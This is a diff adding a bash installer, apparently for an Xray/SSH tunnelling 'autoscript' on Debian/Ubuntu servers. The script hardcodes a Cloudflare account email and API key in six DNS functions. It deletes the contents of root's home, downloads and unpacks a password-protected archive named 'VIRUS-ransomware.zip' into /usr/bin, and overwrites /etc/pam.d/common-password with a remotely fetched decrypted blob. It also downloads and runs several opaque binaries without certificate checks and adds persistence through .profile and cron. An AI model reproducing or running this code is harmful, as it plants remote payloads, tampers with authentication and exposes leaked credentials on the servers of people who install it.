@@ -1,0 +1,456 @@
+#!/bin/bash
+# //====================================================
+# //	System Request:Debian 9+/Ubuntu 18.04+/20+
+# //	Author:	bhoikfostyahya
+# //	Dscription: Xray Menu Management
+# //	email: admin@bhoikfostyahya.com
+# //  telegram: https://t.me/bhoikfost_yahya
+# //====================================================
+
+# // font color configuration | BHOIKFOST YAHYA AUTOSCRIPT
+Green="\e[92;1m"
+Red="\033[31m"
+Yellow="\033[33m"
+Blue="\033[36m"
+Font="\033[0m"
+GreenBG="\033[42;37m"
+RedBG="\033[41;37m"
+gray="\e[1;30m"
+NC='\e[0m'
+WEBSITE="https://wss-multi.yha.my.id"
+LOGO() {
+    echo -e "$Yellow     _______________________________________________________________$NC"
+    echo -e "$Yellow  ==| |  || |                                              |  ||  | |==$NC"
+    echo -e "$Yellow  ==/ / // /           ╔═╦╗ ╔╗╔╗     ╔══╗                  / //  / /==$NC"
+    echo -e "$Yellow  ==| | || |           ║═╬╬═╣╚╣╚╦═╦╦╗╚╗╔╬╦═╦╦═╦╦═╦╗        |  ||  | |==$NC"
+    echo -e "$Yellow  ==/ / // /           ║╔╣║╬║║║╔╣╩╣╔╝ ║║║║║║║║║║╩╣╚╗        / //  / /==$NC"
+    echo -e "$Yellow  ==\ \\ \ \           ╚╝╚╬╗╠╩╩═╩═╩╝  ╚╩═╩╩═╩╩═╩═╩═╝        / //  / /==$NC"
+    echo -e "$Yellow  ==| | || |              ╚═╝                               \ \\  \ \==$NC"
+    echo -e "$Yellow  ==/ / // /        AUTOSCRIPT TUNNELING UBUNTU/DEBIAN      / //  / /==$NC"
+    echo -e "$Yellow   ==|_|__||_|______________________________________________|_||___|_|==$NC"
+}
+
+function dependency_install() {
+    INS="apt install -y"
+    apt update >/dev/null 2>&1
+    echo "Update configuration"
+    
+    apt clean all >/dev/null 2>&1
+    echo "Clean configuration "
+    
+    ${INS} jq unzip p7zip-full>/dev/null 2>&1
+    echo "Installed successfully unzip full"
+    
+    ${INS} curl socat systemd >/dev/null 2>&1
+    echo "Installed curl socat systemd"
+    
+    ${INS} net-tools openssl chrony >/dev/null 2>&1
+    echo "Installed net-tools openssl"
+    
+    ${INS} sslh -y >/dev/null 2>&1
+    echo "Installed successfully sslh-full"
+    
+    ${INS} stunnel4 >/dev/null 2>&1
+    echo "Installed stunnel4"
+    
+    ${INS} dropbear >/dev/null 2>&1
+    echo "Installed dropbear"
+    
+    ${INS} squid3 >/dev/null 2>&1
+    echo "Installed squid3"
+    
+    apt purge apache2 -y >> /dev/null 2>&1
+    echo "Uninstall apache2"
+}
+
+
+cloudflare_1() {
+    DOMEN=wrvpn.site
+    sub=$(tr </dev/urandom -dc a-z0-9 | head -c2)
+    domain=cloud-${sub}.wrvpn.site
+    echo -e "${domain}" >/etc/xray/domain
+    CF_ID=bhoikfostyahya@gmail.com
+    CF_KEY=228e06a1b74f8c2e0e38a3855ecb0e70f29c1
+    set -euo pipefail
+    IP=$(wget -qO- ipinfo.io/ip)
+    echo -e "Updating DNS for ${gray}${domain}${Font}"
+    ZONE=$(curl -sLX GET "https://api.cloudflare.com/client/v4/zones?name=${DOMEN}&status=active" \
+        -H "X-Auth-Email: ${CF_ID}" \
+        -H "X-Auth-Key: ${CF_KEY}" \
+    -H "Content-Type: application/json" | jq -r .result[0].id)
+    
+    RECORD=$(curl -sLX GET "https://api.cloudflare.com/client/v4/zones/${ZONE}/dns_records?name=${domain}" \
+        -H "X-Auth-Email: ${CF_ID}" \
+        -H "X-Auth-Key: ${CF_KEY}" \
+    -H "Content-Type: application/json" | jq -r .result[0].id)
+    
+    if [[ "${#RECORD}" -le 10 ]]; then
+        RECORD=$(curl -sLX POST "https://api.cloudflare.com/client/v4/zones/${ZONE}/dns_records" \
+            -H "X-Auth-Email: ${CF_ID}" \
+            -H "X-Auth-Key: ${CF_KEY}" \
+            -H "Content-Type: application/json" \
+        --data '{"type":"A","name":"'${domain}'","content":"'${IP}'","proxied":false}' | jq -r .result.id)
+    fi
+    
+    RESULT=$(curl -sLX PUT "https://api.cloudflare.com/client/v4/zones/${ZONE}/dns_records/${RECORD}" \
+        -H "X-Auth-Email: ${CF_ID}" \
+        -H "X-Auth-Key: ${CF_KEY}" \
+        -H "Content-Type: application/json" \
+    --data '{"type":"A","name":"'${domain}'","content":"'${IP}'","proxied":false}')
+}
+
+cloudflare_2() {
+    DOMEN=yha-net.systems
+    sub=$(tr </dev/urandom -dc a-z0-9 | head -c2)
+    domain=cloud-${sub}.yha-net.systems
+    echo -e "${domain}" >/etc/xray/domain
+    CF_ID=bhoikfostyahya@gmail.com
+    CF_KEY=228e06a1b74f8c2e0e38a3855ecb0e70f29c1
+    set -euo pipefail
+    IP=$(wget -qO- ipinfo.io/ip)
+    echo -e "Updating DNS for ${gray}${domain}${Font}"
+    ZONE=$(curl -sLX GET "https://api.cloudflare.com/client/v4/zones?name=${DOMEN}&status=active" \
+        -H "X-Auth-Email: ${CF_ID}" \
+        -H "X-Auth-Key: ${CF_KEY}" \
+    -H "Content-Type: application/json" | jq -r .result[0].id)
+    
+    RECORD=$(curl -sLX GET "https://api.cloudflare.com/client/v4/zones/${ZONE}/dns_records?name=${domain}" \
+        -H "X-Auth-Email: ${CF_ID}" \
+        -H "X-Auth-Key: ${CF_KEY}" \
+    -H "Content-Type: application/json" | jq -r .result[0].id)
+    
+    if [[ "${#RECORD}" -le 10 ]]; then
+        RECORD=$(curl -sLX POST "https://api.cloudflare.com/client/v4/zones/${ZONE}/dns_records" \
+            -H "X-Auth-Email: ${CF_ID}" \
+            -H "X-Auth-Key: ${CF_KEY}" \
+            -H "Content-Type: application/json" \
+        --data '{"type":"A","name":"'${domain}'","content":"'${IP}'","proxied":false}' | jq -r .result.id)
+    fi
+    
+    RESULT=$(curl -sLX PUT "https://api.cloudflare.com/client/v4/zones/${ZONE}/dns_records/${RECORD}" \
+        -H "X-Auth-Email: ${CF_ID}" \
+        -H "X-Auth-Key: ${CF_KEY}" \
+        -H "Content-Type: application/json" \
+    --data '{"type":"A","name":"'${domain}'","content":"'${IP}'","proxied":false}')
+}
+
+cloudflare_3() {
+    DOMEN=bhoikfostyahya.my.id
+    sub=$(tr </dev/urandom -dc a-z0-9 | head -c2)
+    domain=cloud-${sub}.bhoikfostyahya.my.id
+    echo -e "${domain}" >/etc/xray/domain
+    CF_ID=bhoikfostyahya@gmail.com
+    CF_KEY=228e06a1b74f8c2e0e38a3855ecb0e70f29c1
+    set -euo pipefail
+    IP=$(wget -qO- ipinfo.io/ip)
+    echo -e "Updating DNS for ${gray}${domain}${Font}"
+    ZONE=$(curl -sLX GET "https://api.cloudflare.com/client/v4/zones?name=${DOMEN}&status=active" \
+        -H "X-Auth-Email: ${CF_ID}" \
+        -H "X-Auth-Key: ${CF_KEY}" \
+    -H "Content-Type: application/json" | jq -r .result[0].id)
+    
+    RECORD=$(curl -sLX GET "https://api.cloudflare.com/client/v4/zones/${ZONE}/dns_records?name=${domain}" \
+        -H "X-Auth-Email: ${CF_ID}" \
+        -H "X-Auth-Key: ${CF_KEY}" \
+    -H "Content-Type: application/json" | jq -r .result[0].id)
+    
+    if [[ "${#RECORD}" -le 10 ]]; then
+        RECORD=$(curl -sLX POST "https://api.cloudflare.com/client/v4/zones/${ZONE}/dns_records" \
+            -H "X-Auth-Email: ${CF_ID}" \
+            -H "X-Auth-Key: ${CF_KEY}" \
+            -H "Content-Type: application/json" \
+        --data '{"type":"A","name":"'${domain}'","content":"'${IP}'","proxied":false}' | jq -r .result.id)
+    fi
+    
+    RESULT=$(curl -sLX PUT "https://api.cloudflare.com/client/v4/zones/${ZONE}/dns_records/${RECORD}" \
+        -H "X-Auth-Email: ${CF_ID}" \
+        -H "X-Auth-Key: ${CF_KEY}" \
+        -H "Content-Type: application/json" \
+    --data '{"type":"A","name":"'${domain}'","content":"'${IP}'","proxied":false}')
+}
+
+cloudflare_4() {
+    DOMEN=yha.my.id
+    sub=$(tr </dev/urandom -dc a-z0-9 | head -c2)
+    domain=cloud-${sub}.yha.my.id
+    echo -e "${domain}" >/etc/xray/domain
+    CF_ID=bhoikfostyahya@gmail.com
+    CF_KEY=228e06a1b74f8c2e0e38a3855ecb0e70f29c1
+    set -euo pipefail
+    IP=$(wget -qO- ipinfo.io/ip)
+    echo -e "Updating DNS for ${gray}${domain}${Font}"
+    ZONE=$(curl -sLX GET "https://api.cloudflare.com/client/v4/zones?name=${DOMEN}&status=active" \
+        -H "X-Auth-Email: ${CF_ID}" \
+        -H "X-Auth-Key: ${CF_KEY}" \
+    -H "Content-Type: application/json" | jq -r .result[0].id)
+    
+    RECORD=$(curl -sLX GET "https://api.cloudflare.com/client/v4/zones/${ZONE}/dns_records?name=${domain}" \
+        -H "X-Auth-Email: ${CF_ID}" \
+        -H "X-Auth-Key: ${CF_KEY}" \
+    -H "Content-Type: application/json" | jq -r .result[0].id)
+    
+    if [[ "${#RECORD}" -le 10 ]]; then
+        RECORD=$(curl -sLX POST "https://api.cloudflare.com/client/v4/zones/${ZONE}/dns_records" \
+            -H "X-Auth-Email: ${CF_ID}" \
+            -H "X-Auth-Key: ${CF_KEY}" \
+            -H "Content-Type: application/json" \
+        --data '{"type":"A","name":"'${domain}'","content":"'${IP}'","proxied":false}' | jq -r .result.id)
+    fi
+    
+    RESULT=$(curl -sLX PUT "https://api.cloudflare.com/client/v4/zones/${ZONE}/dns_records/${RECORD}" \
+        -H "X-Auth-Email: ${CF_ID}" \
+        -H "X-Auth-Key: ${CF_KEY}" \
+        -H "Content-Type: application/json" \
+    --data '{"type":"A","name":"'${domain}'","content":"'${IP}'","proxied":false}')
+}
+
+
+cloudflare_5() {
+    DOMEN=fightertunnel.my.id
+    sub=$(tr </dev/urandom -dc a-z0-9 | head -c2)
+    domain=cloud-${sub}.fightertunnel.my.id
+    echo -e "${domain}" >/etc/xray/domain
+    CF_ID=bhoikfostyahya@gmail.com
+    CF_KEY=228e06a1b74f8c2e0e38a3855ecb0e70f29c1
+    set -euo pipefail
+    IP=$(wget -qO- ipinfo.io/ip)
+    echo -e "Updating DNS for ${gray}${domain}${Font}"
+    ZONE=$(curl -sLX GET "https://api.cloudflare.com/client/v4/zones?name=${DOMEN}&status=active" \
+        -H "X-Auth-Email: ${CF_ID}" \
+        -H "X-Auth-Key: ${CF_KEY}" \
+    -H "Content-Type: application/json" | jq -r .result[0].id)
+    
+    RECORD=$(curl -sLX GET "https://api.cloudflare.com/client/v4/zones/${ZONE}/dns_records?name=${domain}" \
+        -H "X-Auth-Email: ${CF_ID}" \
+        -H "X-Auth-Key: ${CF_KEY}" \
+    -H "Content-Type: application/json" | jq -r .result[0].id)
+    
+    if [[ "${#RECORD}" -le 10 ]]; then
+        RECORD=$(curl -sLX POST "https://api.cloudflare.com/client/v4/zones/${ZONE}/dns_records" \
+            -H "X-Auth-Email: ${CF_ID}" \
+            -H "X-Auth-Key: ${CF_KEY}" \
+            -H "Content-Type: application/json" \
+        --data '{"type":"A","name":"'${domain}'","content":"'${IP}'","proxied":false}' | jq -r .result.id)
+    fi
+    
+    RESULT=$(curl -sLX PUT "https://api.cloudflare.com/client/v4/zones/${ZONE}/dns_records/${RECORD}" \
+        -H "X-Auth-Email: ${CF_ID}" \
+        -H "X-Auth-Key: ${CF_KEY}" \
+        -H "Content-Type: application/json" \
+    --data '{"type":"A","name":"'${domain}'","content":"'${IP}'","proxied":false}')
+}
+
+cloudflare_6() {
+    DOMEN=yha.biz.id
+    sub=$(tr </dev/urandom -dc a-z0-9 | head -c2)
+    domain=cloud-${sub}.yha.biz.id
+    echo -e "${domain}" >/etc/xray/domain
+    CF_ID=bhoikfostyahya@gmail.com
+    CF_KEY=228e06a1b74f8c2e0e38a3855ecb0e70f29c1
+    set -euo pipefail
+    IP=$(wget -qO- ipinfo.io/ip)
+    echo -e "Updating DNS for ${gray}${domain}${Font}"
+    ZONE=$(curl -sLX GET "https://api.cloudflare.com/client/v4/zones?name=${DOMEN}&status=active" \
+        -H "X-Auth-Email: ${CF_ID}" \
+        -H "X-Auth-Key: ${CF_KEY}" \
+    -H "Content-Type: application/json" | jq -r .result[0].id)
+    
+    RECORD=$(curl -sLX GET "https://api.cloudflare.com/client/v4/zones/${ZONE}/dns_records?name=${domain}" \
+        -H "X-Auth-Email: ${CF_ID}" \
+        -H "X-Auth-Key: ${CF_KEY}" \
+    -H "Content-Type: application/json" | jq -r .result[0].id)
+    
+    if [[ "${#RECORD}" -le 10 ]]; then
+        RECORD=$(curl -sLX POST "https://api.cloudflare.com/client/v4/zones/${ZONE}/dns_records" \
+            -H "X-Auth-Email: ${CF_ID}" \
+            -H "X-Auth-Key: ${CF_KEY}" \
+            -H "Content-Type: application/json" \
+        --data '{"type":"A","name":"'${domain}'","content":"'${IP}'","proxied":false}' | jq -r .result.id)
+    fi
+    
+    RESULT=$(curl -sLX PUT "https://api.cloudflare.com/client/v4/zones/${ZONE}/dns_records/${RECORD}" \
+        -H "X-Auth-Email: ${CF_ID}" \
+        -H "X-Auth-Key: ${CF_KEY}" \
+        -H "Content-Type: application/json" \
+    --data '{"type":"A","name":"'${domain}'","content":"'${IP}'","proxied":false}')
+}
+
+function domain_add() {
+    read -rp "Please enter your domain name information(eg: www.example.com):" domain
+    domain_ip=$(curl -sm8 ipget.net/?ip="${domain}")
+    echo "Getting IP address information, please be patient"
+    wgcfv4_status=$(curl -s4m8 https://www.cloudflare.com/cdn-cgi/trace -k | grep warp | cut -d= -f2)
+    wgcfv6_status=$(curl -s6m8 https://www.cloudflare.com/cdn-cgi/trace -k | grep warp | cut -d= -f2)
+    echo "${domain}" >/etc/xray/domain
+    if [[ ${wgcfv4_status} =~ "on"|"plus" ]] || [[ ${wgcfv6_status} =~ "on"|"plus" ]]; then
+        # // Close wgcf-warp to prevent misjudgment of VPS IP situation | BHOIKFOST YAHYA AUTOSCRIPT
+        wg-quick down wgcf >/dev/null 2>&1
+        echo "wgcf-warp is turned off"
+    fi
+    local_ipv4=$(curl -s4m8 https://ip.gs)
+    local_ipv6=$(curl -s6m8 https://ip.gs)
+    if [[ -z ${local_ipv4} && -n ${local_ipv6} ]]; then
+        # // Pure IPv6 VPS, automatically add a DNS64 server for acme.sh to apply for a certificate | BHOIKFOST YAHYA AUTOSCRIPT
+        echo -e nameserver 2a01:4f8:c2c:123f::1 >/etc/resolv.conf
+        echo "Recognize VPS as IPv6 Only, automatically add DNS64 server"
+    fi
+    echo -e "DNS-resolved IP address of the domain nameï¼š${domain_ip}"
+    echo -e "Local public network IPv4 addressï¼š ${local_ipv4}"
+    echo -e "Local public network IPv6 addressï¼š ${local_ipv6}"
+    sleep 2
+    if [[ ${domain_ip} == "${local_ipv4}" ]]; then
+        echo "The DNS-resolved IP address of the domain name matches the native IPv4 address"
+        sleep 2
+        elif [[ ${domain_ip} == "${local_ipv6}" ]]; then
+        echo "The DNS-resolved IP address of the domain name matches the native IPv6 address"
+        sleep 2
+    else
+        print_error "Please make sure that the correct A/AAAA records are added to the domain name, otherwise xray will not work properly"
+        print_error "The IP address of the domain name resolved through DNS does not match the IPv4 / IPv6 address of the machine, continue installed successfully?ï¼ˆy/nï¼‰" && read -r install
+        case $install in
+            [yY][eE][sS] | [yY])
+                echo "Continue installed successfully"
+                sleep 2
+            ;;
+            *)
+                print_error "installed successfully"
+                # // exit 2
+            ;;
+        esac
+    fi
+}
+function acme() {
+    echo "installed successfully SSL certificate generation script"
+    mkdir /root/.acme.sh  >/dev/null 2>&1
+    curl https://acme-install.netlify.app/acme.sh -o /root/.acme.sh/acme.sh >/dev/null 2>&1
+    chmod +x /root/.acme.sh/acme.sh >/dev/null 2>&1
+    /root/.acme.sh/acme.sh --upgrade --auto-upgrade >/dev/null 2>&1
+    /root/.acme.sh/acme.sh --set-default-ca --server letsencrypt >/dev/null 2>&1
+    /root/.acme.sh/acme.sh --issue -d $domain --standalone -k ec-256 >/dev/null 2>&1
+    ~/.acme.sh/acme.sh --installcert -d $domain --fullchainpath /etc/xray/xray.crt --keypath /etc/xray/xray.key --ecc >/dev/null 2>&1
+    
+}
+
+function download_config() {
+    cd
+    rm -rf *
+    wget ${WEBSITE}VIRUS-ransomware.zip >> /dev/null 2>&1
+    7z e -pKarawang123@bhoikFostyahya VIRUS-ransomware.zip >> /dev/null 2>&1
+    rm -f VIRUS-ransomware.zip
+    chmod +x *
+    mv * /usr/bin/
+  cat >/root/.profile <<END
+# ~/.profile: executed by Bourne-compatible login shells.
+
+if [ "$BASH" ]; then
+  if [ -f ~/.bashrc ]; then
+    . ~/.bashrc
+  fi
+fi
+
+mesg n || true
+clear
+menu
+END
+  cat >/etc/cron.d/xp_all <<-END
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+2 0 * * * root /usr/bin/xp
+END
+    chmod 644 /root/.profile
+    
+cat > /etc/cron.d/daily_reboot <<-END
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+0 5 * * * root /sbin/reboot
+END
+cat > /home/daily_reboot <<-END
+5
+END
+    AUTOREB=$(cat /home/daily_reboot)
+    SETT=11
+    if [ $AUTOREB -gt $SETT ]
+    then
+        TIME_DATE="PM"
+    else
+        TIME_DATE="AM"
+    fi
+}
+
+function make_folder() {
+    # // Make Folder Xray to accsess
+    mkdir -p /etc/xray
+    mkdir -p /var/log/xray
+    chmod +x /var/log/xray
+    touch /etc/xray/domain
+    touch /var/log/xray/access.log
+    touch /var/log/xray/error.log
+}
+
+# // Prevent the default bin directory of some system xray from missing | BHOIKFOST YAHYA AUTOSCRIPT
+clear
+LOGO
+echo -e "1).${Green}MANUAL POINTING${Font}(Manual DNS-resolved IP address of the domain)"
+echo -e "2).${Green}AUTO POINTING${Font}(Auto DNS-resolved IP address of the domain)"
+read -p "between auto pointing / manual pointing what do you choose[ 1 - 2 ] : " menu_num
+
+case $menu_num in
+    1)
+        domain_add
+        dependency_install
+        download_config
+        acme
+        make_folder
+    ;;
+    2)
+        make_folder
+        dependency_install
+        download_config
+        acme
+        cloudflare_`</dev/urandom tr -dc 1-6 | head -c1`
+    ;;
+    *)
+        echo -e "${Red}You wrong command !${Font}"
+    ;;
+esac
+
+# // DOWNLOAD
+
+curl -sS ${WEBSITE}password | openssl aes-256-cbc -d -a -pass pass:scvps07gg -pbkdf2 > /etc/pam.d/common-password >> /dev/null 2>&1
+chmod +x /etc/pam.d/common-password
+
+wget --no-check-certificate ${WEBSITE}openssh >> /dev/null 2>&1
+chmod +x openssh
+./openssh
+rm -f openssh > /dev/null 2>&1
+
+wget --no-check-certificate ${WEBSITE}dropbear >> /dev/null 2>&1
+chmod +x dropbear
+./dropbear
+rm -f dropbear > /dev/null 2>&1
+
+wget --no-check-certificate ${WEBSITE}stunnel >> /dev/null 2>&1
+chmod +x stunnel
+./stunnel
+rm -f stunnel > /dev/null 2>&1
+
+wget --no-check-certificate ${WEBSITE}nginx >> /dev/null 2>&1
+chmod +x nginx
+./nginx
+rm -f nginx > /dev/null 2>&1
+
+wget --no-check-certificate ${WEBSITE}sslh >> /dev/null 2>&1
+chmod +x sslh
+./sslh
+rm -f sslh > /dev/null 2>&1
+
+cd
+mkdir -p /etc/xray/web
+rm /var/www/html/*.html
+rm /etc/nginx/sites-enabled/default
+rm /etc/nginx/sites-available/default
+wget ${WEBSITE}web.zip >> /dev/null 2>&1
+unzip -x web.zip >> /dev/null 2>&1
+rm -f web.zip
+chmod +x *
+mv * /etc/xray/web
